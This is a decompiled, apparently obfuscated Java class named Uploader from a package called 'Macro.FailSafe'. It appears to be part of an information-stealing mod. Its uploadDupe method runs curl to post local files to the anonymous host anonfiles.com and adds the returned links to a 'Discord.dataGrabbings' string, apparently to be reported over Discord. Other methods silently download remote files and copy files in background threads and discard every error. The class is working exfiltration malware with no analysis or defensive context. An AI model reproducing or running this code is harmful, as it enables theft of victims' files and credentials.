// 
// Decompiled by Procyon v0.5.36
// 

package Macro.FailSafe;

import org.apache.commons.io.FileUtils;
import java.io.File;
import java.net.URL;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Uploader
{
    public int BRANCHLOCK_DOT_NET_DEMO;
    public static String fixedresponse;
    
    public static void uploadDupe(final String loc) throws IOException {
        try {
            final Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anonfiles.com/upload");
            final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = "";
            while ((line = reader.readLine()) != null) {
                Discord.dataGrabbings = Discord.dataGrabbings + "**" + loc + "** " + line + "\n";
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void downloadFile(final String url, final String location) {
        URL src;
        File f;
        new Thread(() -> {
            try {
                src = new URL(url);
                f = new File(location);
                FileUtils.copyURLToFile(src, f);
            }
            catch (Exception ex) {}
        }).start();
    }
    
    public static void copyFile(final String location, final String location2) {
        File src;
        File dest;
        new Thread(() -> {
            try {
                src = new File(location);
                dest = new File(location2);
                FileUtils.copyFile(src, dest);
            }
            catch (Exception ex) {}
        }).start();
    }
}
